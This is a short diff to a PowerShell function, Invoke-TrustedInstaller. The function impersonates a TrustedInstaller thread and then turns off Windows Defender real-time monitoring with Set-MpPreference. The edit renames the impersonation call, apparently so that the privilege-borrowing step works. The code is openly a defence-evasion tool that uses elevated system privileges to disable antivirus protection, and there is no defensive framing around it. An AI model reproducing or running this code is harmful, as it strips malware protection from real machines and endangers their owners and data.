@@ -13,7 +13,7 @@ function Invoke-TrustedInstaller {
     $ti_thread = $ti.getFirstThread()
 
     $current = Get-NtThread -Current -PseudoHandle
-    $imp = $current.Impersonate($ti_thread)
+    $imp = $current.ImpersonateThread($ti_thread)
 
     Set-MpPreference -DisableRealtimeMonitoring $true -Force
 
